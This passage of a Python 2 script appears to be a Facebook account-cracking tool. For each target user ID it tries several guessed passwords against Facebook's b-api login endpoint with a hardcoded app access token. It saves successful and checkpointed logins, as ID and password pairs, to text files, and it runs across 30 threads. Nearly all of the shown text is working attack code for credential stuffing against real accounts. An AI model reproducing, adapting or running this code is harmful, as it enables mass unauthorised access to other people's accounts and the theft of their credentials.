                        data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass4 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                        q = json.loads(data)
                        if 'access_token' in q:
                            print ' \x1b[1;32m [AL3X-OK] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('Abdullahok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;31m [AL3X-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('Abdullahcp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                        else:
                            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass5 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                            q = json.loads(data)
                            if 'access_token' in q:
                                print ' \x1b[1;32m [AL3X-OK] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('Abdullahok.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;31m [AL3X-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                cp = open('Abdullahcp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                            else:
                                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass6 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print ' \x1b[1;32m [AL3X-OK] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('Abdullahok.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print ' \x1b[1;31m [AL3X-CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    cp = open('Abdullahcp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid + pass6)
                                else:
                                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass7 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                                    q = json.loads(data)
                                    if 'access_token' in q:
                                        print ' \x1b[1;32m [AL3X-OK] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('Abdullahok.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print ' \x1b[1;31m [AL3X-CP] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        cp = open('Abdullahcp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid + pass7)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    os.system('echo -e "---------------------------------------------"| lolcat')
    print("   \x1b[1;97mThe process has been completed")
    print("   \x1b[1;92m Total Ok/Cp: "+str(len(oks))+"/"+str(len(cps)))
    os.system('echo -e "---------------------------------------------"| lolcat')
    raw_input(' \x1b[1;97m Press enter to back ')
    main()


if __name__ == '__main__':
    login()
